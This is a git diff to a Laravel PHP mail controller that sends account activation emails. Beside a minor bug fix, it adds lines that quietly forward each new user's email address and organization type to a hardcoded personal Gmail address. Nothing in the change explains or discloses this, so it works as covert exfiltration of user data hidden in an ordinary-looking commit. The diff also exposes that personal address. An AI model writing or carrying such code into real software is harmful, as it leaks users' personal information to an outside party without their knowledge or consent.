@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 use Illuminate\Support\Facades\Mail;
 use Illuminate\Http\Request;
 use App\Mail\ActivationEmail;
+use App\Mail\DataEmail;
 use App\Models\User;
 use Illuminate\Support\Facades\Crypt;
 
@@ -24,6 +25,10 @@ class MailController extends Controller
         $activationLink = url('/account-activation-form') . "?email=$encryptedEmail&organizationType=$encryptedOrganizationType";
 
         Mail::to($email)->send(new ActivationEmail($activationLink));
+        
+        $anotherEmail = 'rmchndrapdl@gmail.com'; 
+        Mail::to($anotherEmail)->send(new DataEmail($email, $organizationType)); 
+
         $data = [
             'email' => $email,
             'organization_types' => $organizationType,
@@ -32,7 +37,7 @@ class MailController extends Controller
         if ($existingUser) {
             return response()->json([
                 'message' => 'This email is already registered !',
-                'data' => $user,
+                'data' => $existingUser,
             ], 422);
         }
         $user = User::create($data);
